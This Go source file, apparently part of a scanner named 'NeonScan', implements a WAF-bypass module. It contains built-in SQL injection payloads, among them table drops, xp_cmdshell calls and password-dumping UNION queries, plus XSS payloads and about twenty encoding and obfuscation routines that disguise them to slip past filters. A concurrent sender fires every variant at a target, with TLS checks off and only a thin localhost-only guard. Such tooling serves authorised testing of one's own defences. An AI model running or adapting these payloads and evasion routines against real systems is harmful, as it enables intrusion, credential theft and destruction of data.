// Package main WAF绕过测试功能模块
// 该模块实现了WAF（Web Application Firewall）绕过测试功能，支持多种绕过策略和Payload变形
package main

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"
)

// PayloadType Payload类型
type PayloadType string

const (
	PayloadTypeSQLi PayloadType = "sqli" // SQL注入
	PayloadTypeXSS  PayloadType = "xss"  // XSS跨站脚本
	PayloadTypeAll  PayloadType = "all"  // 全部类型
)

// WAFBypassReq WAF绕过测试请求
// 前端发送的WAF绕过测试请求参数
type WAFBypassReq struct {
	BaseURL     string      `json:"baseUrl"`     // 目标基础URL
	Path        string      `json:"path"`        // 请求路径
	Payloads    []string    `json:"payloads"`    // 测试用的Payload列表
	Methods     []string    `json:"methods"`     // HTTP方法列表（如GET、POST）
	Strategies  []string    `json:"strategies"`  // 绕过策略列表
	Match       string      `json:"match"`       // 可选的成功标识字符串
	Concurrency int         `json:"concurrency"` // 并发数（默认50）
	TimeoutMs   int         `json:"timeoutMs"`   // 请求超时时间（毫秒，默认4000）
	PayloadType PayloadType `json:"payloadType"` // Payload类型：sqli, xss, all
}

// 内置SQL注入Payload库
var sqliPayloads = []string{
	"1 OR 1=1",
	"1' OR '1'='1",
	"1\" OR \"1\"=\"1",
	"admin'--",
	"1 UNION SELECT NULL--",
	"1 UNION SELECT NULL,NULL--",
	"1 UNION ALL SELECT NULL--",
	"1 AND 1=1",
	"1' AND '1'='1",
	"1\" AND \"1\"=\"1",
	"' OR 1=1 --",
	"\" OR 1=1 --",
	"OR 1=1--",
	"' OR 'x'='x",
	"\" OR \"x\"=\"x",
	"') OR ('1'='1",
	"\") OR (\"1\"=\"1",
	"1' ORDER BY 1--",
	"1' ORDER BY 2--",
	"1' UNION SELECT username,password FROM users--",
	"1'; DROP TABLE users--",
	"1'; EXEC xp_cmdshell('dir')--",
	"1' AND (SELECT COUNT(*) FROM sysobjects)>0--",
	"1' AND (SELECT COUNT(*) FROM msysobjects)>0--",
	"1' UNION SELECT @@version--",
	"1' UNION SELECT user,password FROM mysql.user--",
	"1'; WAITFOR DELAY '00:00:05'--",
}

// 内置XSS Payload库
var xssPayloads = []string{
	"<script>alert(1)</script>",
	"<script>alert('XSS')</script>",
	"<img src=x onerror=alert(1)>",
	"<svg onload=alert(1)>",
	"<iframe src=javascript:alert(1)>",
	"<body onload=alert(1)>",
	"javascript:alert(1)",
	"<script>eval(atob('YWxlcnQoMSk='))</script>",
	"<img src=\"x\"onerror=\"alert(1)\">",
	"<input onfocus=alert(1) autofocus>",
	"<select onfocus=alert(1) autofocus>",
	"<textarea onfocus=alert(1) autofocus>",
	"<keygen onfocus=alert(1) autofocus>",
	"<video><source onerror=alert(1)>",
	"<audio src=x onerror=alert(1)>",
	"<details open ontoggle=alert(1)>",
	"<marquee onstart=alert(1)>",
	"<meter onmouseover=alert(1)>0</meter>",
	"<object data=\"javascript:alert(1)\">",
	"<embed src=\"javascript:alert(1)\">",
	"<form action=\"javascript:alert(1)\"><input type=submit>",
	"<isindex action=\"javascript:alert(1)\" type=submit>",
	"<svg><script>alert(1)</script></svg>",
	"<svg><script>alert&#40;1&#41;</script></svg>",
	"<script>alert(1)</script>",
	"<script>alert(String.fromCharCode(88,83,83))</script>",
	"<scr<script>ipt>alert(1)</scr</script>ipt>",
	"<script>z=document.createElement('script');z.src='x';document.body.appendChild(z)</script>",
	"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
}

// DetectPayloadType 检测Payload类型
func DetectPayloadType(p string) PayloadType {
	low := strings.ToLower(p)
	// SQL注入特征
	sqliPatterns := []string{
		"or 1=1", "or '1'='1", "or \"1\"=\"1",
		"union select", "union all select",
		"order by", "group by",
		"select ", "insert ", "update ", "delete ",
		"drop table", "exec ", "xp_",
		"--", "/*", "*/", "#",
		"' or ", "\" or ",
		"waitfor", "benchmark",
		"1=1", "'1'='1", "\"1\"=\"1",
	}
	for _, pat := range sqliPatterns {
		if strings.Contains(low, pat) {
			return PayloadTypeSQLi
		}
	}
	// XSS特征
	xssPatterns := []string{
		"<script", "</script>",
		"javascript:",
		"onerror=", "onload=", "onclick=",
		"onfocus=", "onblur=", "onchange=",
		"onsubmit=", "onreset=", "onselect=",
		"onkeydown=", "onkeypress=", "onkeyup=",
		"onmouseover=", "onmouseout=", "onmousedown=",
		"alert(", "prompt(", "confirm(",
		"<img", "<svg", "<iframe", "<body",
		"<input", "<select", "<textarea",
		"<object", "<embed", "<form",
	}
	for _, pat := range xssPatterns {
		if strings.Contains(low, pat) {
			return PayloadTypeXSS
		}
	}
	return PayloadTypeAll
}

// FilterPayloadsByType 根据类型过滤Payload
func FilterPayloadsByType(payloads []string, pType PayloadType) []string {
	if pType == PayloadTypeAll {
		return payloads
	}
	var filtered []string
	for _, p := range payloads {
		if DetectPayloadType(p) == pType {
			filtered = append(filtered, p)
		}
	}
	return filtered
}

// sCase 大小写变换策略
func sCase(p string) []string {
	return []string{strings.ToUpper(p), strings.ToLower(p)}
}

// sUrlEncode URL编码策略
func sUrlEncode(p string) []string {
	return []string{urlEncode(p)}
}

// sDoubleEncode 双重URL编码策略
func sDoubleEncode(p string) []string {
	return []string{urlEncode(urlEncode(p))}
}

// sTripleEncode 三重URL编码策略
func sTripleEncode(p string) []string {
	return []string{urlEncode(urlEncode(urlEncode(p)))}
}

// sSpace2Comment 空格替换为注释
func sSpace2Comment(p string) []string {
	if !strings.Contains(p, " ") {
		return nil
	}
	return []string{strings.ReplaceAll(p, " ", "/**/")}
}

// sTab2Space Tab替换为空格
func sTab2Space(p string) []string {
	if !strings.Contains(p, "\t") {
		return nil
	}
	return []string{strings.ReplaceAll(p, "\t", " ")}
}

// sNewline2Space 换行替换为空格
func sNewline2Space(p string) []string {
	if !strings.Contains(p, "\n") {
		return nil
	}
	return []string{strings.ReplaceAll(p, "\n", " ")}
}

// sSplitKeywords 分割关键词
func sSplitKeywords(p string) []string {
	replaceWord := func(w string) string {
		if w == "" {
			return w
		}
		var b strings.Builder
		for i, r := range w {
			if i > 0 {
				b.WriteString("/**/")
			}
			b.WriteRune(r)
		}
		return b.String()
	}
	keywords := []string{"or", "union", "select", "script", "alert", "javascript", "onerror", "onload"}
	out := []string{}
	low := strings.ToLower(p)
	changed := false
	for _, k := range keywords {
		if strings.Contains(low, k) {
			changed = true
			break
		}
	}
	if !changed {
		return nil
	}
	v := p
	for _, k := range keywords {
		v = regexp.MustCompile(`(?i)`+regexp.QuoteMeta(k)).ReplaceAllStringFunc(v, func(m string) string {
			return replaceWord(m)
		})
	}
	out = append(out, v)
	return out
}

// sHtmlEntity HTML实体编码
func sHtmlEntity(p string) []string {
	repl := map[string]string{
		"<": "&#x3c;", ">": "&#x3e;", "'": "&#x27;",
		"\"": "&#x22;", " ": "&#x20;", "=": "&#x3d;",
		"(": "&#x28;", ")": "&#x29;", "/": "&#x2f;",
		":": "&#x3a;",
	}
	var b strings.Builder
	changed := false
	for _, ch := range p {
		c := string(ch)
		if v, ok := repl[c]; ok {
			b.WriteString(v)
			changed = true
		} else {
			b.WriteString(c)
		}
	}
	if !changed {
		return nil
	}
	return []string{b.String()}
}

// sHtmlEntityDec HTML实体解码（十进制）
func sHtmlEntityDec(p string) []string {
	repl := map[string]string{
		"<": "&#60;", ">": "&#62;", "'": "&#39;",
		"\"": "&#34;", " ": "&#32;", "=": "&#61;",
		"(": "&#40;", ")": "&#41;",
	}
	var b strings.Builder
	changed := false
	for _, ch := range p {
		c := string(ch)
		if v, ok := repl[c]; ok {
			b.WriteString(v)
			changed = true
		} else {
			b.WriteString(c)
		}
	}
	if !changed {
		return nil
	}
	return []string{b.String()}
}

// sUnicode Unicode编码
func sUnicode(p string) []string {
	var b strings.Builder
	for _, r := range p {
		b.WriteString(fmt.Sprintf("\\u%04x", r))
	}
	return []string{b.String()}
}

// sUnicodeJS JavaScript Unicode编码
func sUnicodeJS(p string) []string {
	var b strings.Builder
	for _, r := range p {
		b.WriteString(fmt.Sprintf("\\u{%x}", r))
	}
	return []string{b.String()}
}

// sHex HTML Hex编码
func sHex(p string) []string {
	var b strings.Builder
	for _, r := range p {
		b.WriteString(fmt.Sprintf("&#x%x;", r))
	}
	return []string{b.String()}
}

// sBase64 Base64编码
func sBase64(p string) []string {
	return []string{base64.StdEncoding.EncodeToString([]byte(p))}
}

// sCommentInline 内联注释混淆
func sCommentInline(p string) []string {
	if len(p) < 3 {
		return nil
	}
	// 在每个字符之间插入内联注释
	var b strings.Builder
	for i, r := range p {
		b.WriteRune(r)
		if i < len(p)-1 {
			b.WriteString("/**/")
		}
	}
	return []string{b.String()}
}

// sCommentWrap 注释包裹关键词
func sCommentWrap(p string) []string {
	keywords := []string{"or", "and", "union", "select", "script", "alert", "javascript"}
	low := strings.ToLower(p)
	hasKeyword := false
	for _, k := range keywords {
		if strings.Contains(low, k) {
			hasKeyword = true
			break
		}
	}
	if !hasKeyword {
		return nil
	}
	v := p
	for _, k := range keywords {
		// 包裹关键词：or -> /*!or*/
		v = regexp.MustCompile(`(?i)`+regexp.QuoteMeta(k)).ReplaceAllString(v, "/*!"+k+"*/")
	}
	return []string{v}
}

// sSQLQuote SQL引号混淆
func sSQLQuote(p string) []string {
	// '1'='1' -> '1'='1' or '1'='1
	v := strings.ReplaceAll(p, "'", "\\'")
	if v == p {
		return nil
	}
	return []string{v}
}

// sSQLChar SQL CHAR()函数
func sSQLChar(p string) []string {
	low := strings.ToLower(p)
	if !strings.Contains(low, "select") && !strings.Contains(low, "union") {
		return nil
	}
	var b strings.Builder
	b.WriteString("CHAR(")
	for i, r := range p {
		if i > 0 {
			b.WriteString(",")
		}
		b.WriteString(fmt.Sprintf("%d", r))
	}
	b.WriteString(")")
	return []string{b.String()}
}

// sNullByte 空字节混淆
func sNullByte(p string) []string {
	var b strings.Builder
	for _, r := range p {
		if r == '<' || r == '>' {
			b.WriteRune(r)
			b.WriteString("\\x00")
		} else {
			b.WriteRune(r)
		}
	}
	return []string{b.String()}
}

// sCapitalize 首字母大写
func sCapitalize(p string) []string {
	return []string{strings.Title(strings.ToLower(p))}
}

// sRandomCase 随机大小写
func sRandomCase(p string) []string {
	var b strings.Builder
	for _, r := range p {
		if r >= 'a' && r <= 'z' {
			if time.Now().UnixNano()%2 == 0 {
				b.WriteRune(r - 32)
			} else {
				b.WriteRune(r)
			}
		} else if r >= 'A' && r <= 'Z' {
			if time.Now().UnixNano()%2 == 0 {
				b.WriteRune(r + 32)
			} else {
				b.WriteRune(r)
			}
		} else {
			b.WriteRune(r)
		}
	}
	return []string{b.String()}
}

// sNestedTag 嵌套标签（XSS）
func sNestedTag(p string) []string {
	if !strings.Contains(strings.ToLower(p), "<script") {
		return nil
	}
	v := strings.ReplaceAll(p, "<script", "<scr<script>ipt")
	v = strings.ReplaceAll(v, "</script>", "<scr</script>ipt>")
	return []string{v}
}

// sEventHandlerVariant 事件处理器变体（XSS）
func sEventHandlerVariant(p string) []string {
	if !strings.Contains(strings.ToLower(p), "onerror") &&
		!strings.Contains(strings.ToLower(p), "onload") &&
		!strings.Contains(strings.ToLower(p), "onclick") {
		return nil
	}
	variants := []string{}
	// 替换事件处理器大小写
	eventPatterns := []string{"onerror", "onload", "onclick", "onfocus", "onblur"}
	for _, event := range eventPatterns {
		if strings.Contains(strings.ToLower(p), event) {
			v := regexp.MustCompile(`(?i)`+event).ReplaceAllString(p, strings.ToUpper(event))
			variants = append(variants, v)
		}
	}
	return variants
}

// sProtocolRelative 协议相对URL（XSS）
func sProtocolRelative(p string) []string {
	if !strings.Contains(strings.ToLower(p), "javascript:") {
		return nil
	}
	return []string{strings.ReplaceAll(p, "javascript:", "//javascript:")}
}

// urlEncode 简单的URL编码实现
func urlEncode(s string) string {
	repl := map[string]string{
		" ": "%20", "<": "%3C", ">": "%3E", "\"": "%22",
		"'": "%27", "/": "%2F", "=": "%3D", "&": "%26",
		"(": "%28", ")": "%29", ":": "%3A", ";": "%3B",
	}
	var b strings.Builder
	for _, ch := range s {
		c := string(ch)
		if v, ok := repl[c]; ok {
			b.WriteString(v)
		} else {
			b.WriteString(c)
		}
	}
	return b.String()
}

// PayloadVariant Payload变体及其使用的策略
type PayloadVariant struct {
	Variant    string   // 变体内容
	Strategies []string // 使用的策略列表
}

// getStrategiesForType 获取适用于指定Payload类型的策略
func getStrategiesForType(pType PayloadType) []string {
	switch pType {
	case PayloadTypeSQLi:
		return []string{
			"case", "urlencode", "doubleencode", "tripleencode",
			"space2comment", "tab2space", "newline2space",
			"split", "commentwrap", "sqlliteral",
			"sqlchar", "nullbyte", "capitalize",
		}
	case PayloadTypeXSS:
		return []string{
			"case", "urlencode", "doubleencode", "tripleencode",
			"htmlentity", "htmlentitydec", "unicode", "unicodejs",
			"hex", "base64", "commentinline",
			"nullbyte", "nestedtag", "eventhandlervariant", "protocolrelative",
		}
	default:
		return []string{
			"case", "urlencode", "doubleencode", "tripleencode",
			"space2comment", "htmlentity", "unicode", "base64",
		}
	}
}

// mutatePayload 根据策略列表对Payload进行变形
func mutatePayload(p string, strategies []string, pType PayloadType) []PayloadVariant {
	variants := []PayloadVariant{
		{Variant: p, Strategies: []string{"original"}},
	}
	variantMap := map[string]bool{p: true}

	add := func(xs []string, strategy string) {
		for _, x := range xs {
			if x != "" && !variantMap[x] {
				variantMap[x] = true
				variants = append(variants, PayloadVariant{
					Variant:    x,
					Strategies: []string{strategy},
				})
			}
		}
	}

	// 如果没有指定策略，使用默认策略
	if len(strategies) == 0 {
		strategies = getStrategiesForType(pType)
	}

	for _, s := range strategies {
		s = strings.ToLower(strings.TrimSpace(s))
		switch s {
		case "case":
			add(sCase(p), "case")
		case "urlencode":
			add(sUrlEncode(p), "urlencode")
		case "doubleencode":
			add(sDoubleEncode(p), "doubleencode")
		case "tripleencode":
			add(sTripleEncode(p), "tripleencode")
		case "space2comment":
			add(sSpace2Comment(p), "space2comment")
		case "tab2space":
			add(sTab2Space(p), "tab2space")
		case "newline2space":
			add(sNewline2Space(p), "newline2space")
		case "split":
			add(sSplitKeywords(p), "split")
		case "htmlentity":
			add(sHtmlEntity(p), "htmlentity")
		case "htmlentitydec":
			add(sHtmlEntityDec(p), "htmlentitydec")
		case "unicode":
			add(sUnicode(p), "unicode")
		case "unicodejs":
			add(sUnicodeJS(p), "unicodejs")
		case "hex":
			add(sHex(p), "hex")
		case "base64":
			add(sBase64(p), "base64")
		case "commentinline":
			add(sCommentInline(p), "commentinline")
		case "commentwrap":
			add(sCommentWrap(p), "commentwrap")
		case "sqlliteral":
			add(sSQLQuote(p), "sqlliteral")
		case "sqlchar":
			add(sSQLChar(p), "sqlchar")
		case "nullbyte":
			add(sNullByte(p), "nullbyte")
		case "capitalize":
			add(sCapitalize(p), "capitalize")
		case "nestedtag":
			add(sNestedTag(p), "nestedtag")
		case "eventhandlervariant":
			add(sEventHandlerVariant(p), "eventhandlervariant")
		case "protocolrelative":
			add(sProtocolRelative(p), "protocolrelative")
		}
	}
	return variants
}

// wafBypassHandler WAF绕过测试处理器
func wafBypassHandler(w http.ResponseWriter, r *http.Request) {
	var req WAFBypassReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	pu, err := url.Parse(req.BaseURL)
	if err != nil || pu.Scheme == "" || pu.Host == "" {
		http.Error(w, "invalid baseUrl", http.StatusBadRequest)
		return
	}
	if pu.Scheme != "http" && pu.Scheme != "https" {
		http.Error(w, "invalid baseUrl scheme", http.StatusBadRequest)
		return
	}
	host := strings.ToLower(pu.Hostname())
	if host != "localhost" && host != "127.0.0.1" && host != "::1" && host != "0.0.0.0" {
		http.Error(w, "baseUrl must be localhost for demo", http.StatusBadRequest)
		return
	}

	// 如果没有指定Payload类型且没有提供Payload，使用内置库
	payloads := req.Payloads
	if len(payloads) == 0 {
		switch req.PayloadType {
		case PayloadTypeSQLi:
			payloads = sqliPayloads
		case PayloadTypeXSS:
			payloads = xssPayloads
		default:
			payloads = append(append([]string{}, sqliPayloads...), xssPayloads...)
		}
	} else {
		// 根据Payload类型过滤
		if req.PayloadType != "" && req.PayloadType != PayloadTypeAll {
			payloads = FilterPayloadsByType(payloads, req.PayloadType)
		}
	}

	if len(payloads) == 0 {
		http.Error(w, "no payloads after filtering", http.StatusBadRequest)
		return
	}

	methods := req.Methods
	if len(methods) == 0 {
		methods = []string{"GET", "POST"}
	}
	cc := req.Concurrency
	if cc <= 0 {
		cc = 50
	}
	timeout := time.Duration(req.TimeoutMs)
	if timeout <= 0 {
		timeout = 4000 * time.Millisecond
	} else {
		timeout = time.Duration(req.TimeoutMs) * time.Millisecond
	}
	client := &http.Client{Timeout: timeout, Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
	total := len(payloads) * len(methods)
	t := newTask(total)
	go func() {
		sem := make(chan struct{}, cc)
		var wg sync.WaitGroup
		for _, p := range payloads {
			select {
			case <-t.stop:
				goto done
			default:
			}
			mut := mutatePayload(p, req.Strategies, req.PayloadType)
			for _, m := range methods {
				select {
				case <-t.stop:
					goto done
				default:
				}
				wg.Add(1)
				sem <- struct{}{}
				payload := p
				method := strings.ToUpper(m)
				muts := mut
				go func() {
					defer wg.Done()
					select {
					case <-t.stop:
						<-sem
						return
					default:
					}
					var okVariant string
					var okStrategies []string
					var status int
					var firstStatus int
					var firstVariant string
					for _, variant := range muts {
						select {
						case <-t.stop:
							goto doneVariant
						default:
						}
						v := variant.Variant
						targetURL := strings.TrimRight(req.BaseURL, "/") + "/" + strings.TrimLeft(req.Path, "/")
						var body io.Reader
						reqHeaders := map[string]string{"User-Agent": "NeonScan"}
						if method == "GET" {
							actualVariant := v
							if !strings.Contains(v, "%") {
								if strings.Contains(v, "=") {
									parts := strings.SplitN(v, "=", 2)
									if len(parts) == 2 {
										actualVariant = parts[0] + "=" + url.QueryEscape(parts[1])
									}
								} else {
									actualVariant = url.QueryEscape(v)
								}
							}
							if strings.Contains(targetURL, "?") {
								targetURL += "&" + actualVariant
							} else {
								targetURL += "?" + actualVariant
							}
							if len(variant.Strategies) == 1 && variant.Strategies[0] == "original" {
								firstVariant = actualVariant
							}
						} else {
							body = strings.NewReader(v)
							reqHeaders["Content-Type"] = "application/x-www-form-urlencoded"
							if len(variant.Strategies) == 1 && variant.Strategies[0] == "original" {
								firstVariant = v
							}
						}
						req0, reqErr := http.NewRequest(method, targetURL, body)
						if reqErr != nil {
							continue
						}
						for k, vh := range reqHeaders {
							req0.Header.Set(k, vh)
						}
						resp, err := client.Do(req0)
						if err != nil {
							continue
						}
						b, _ := io.ReadAll(resp.Body)
						resp.Body.Close()
						status = resp.StatusCode
						if len(variant.Strategies) == 1 && variant.Strategies[0] == "original" {
							firstStatus = status
						}
						useful := status == 200 || status == 201 || status == 204 || status == 302
						if req.Match != "" {
							useful = useful || strings.Contains(strings.ToLower(string(b)), strings.ToLower(req.Match))
						}
						if useful {
							actualVariant := v
							if method == "GET" {
								if !strings.Contains(v, "%") {
									if strings.Contains(v, "=") {
										parts := strings.SplitN(v, "=", 2)
										if len(parts) == 2 {
											actualVariant = parts[0] + "=" + url.QueryEscape(parts[1])
										}
									} else {
										actualVariant = url.QueryEscape(v)
									}
								}
							}
							okVariant = actualVariant
							okStrategies = variant.Strategies
							goto doneVariant
						}
					}
				doneVariant:
					d, tot := t.IncDone()
					percent := int(math.Round(float64(d) / float64(tot) * 100))
					safeSend(t, SSEMessage{Type: "progress", TaskID: t.ID, Progress: fmt.Sprintf("%d/%d", d, tot), Percent: percent})
					if okVariant != "" {
						displayStrategies := []string{}
						for _, s := range okStrategies {
							if s != "original" {
								displayStrategies = append(displayStrategies, s)
							}
						}
						if len(displayStrategies) == 0 {
							displayStrategies = []string{"原始"}
						}
						safeSend(t, SSEMessage{
							Type:   "find",
							TaskID: t.ID,
							Data: map[string]interface{}{
								"method":      method,
								"payload":     payload,
								"variant":     okVariant,
								"status":      status,
								"strategies":  displayStrategies,
								"payloadType": string(req.PayloadType),
							},
						})
					} else if firstStatus >= 400 {
						safeSend(t, SSEMessage{
							Type:   "scan_log",
							TaskID: t.ID,
							Data: map[string]interface{}{
								"method":     method,
								"payload":    payload,
								"variant":    firstVariant,
								"status":     firstStatus,
								"strategies": []string{"原始"},
							},
						})
					}
					<-sem
				}()
			}
		}
	done:
		wg.Wait()
		finishTask(t.ID)
	}()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"taskId": t.ID})
}
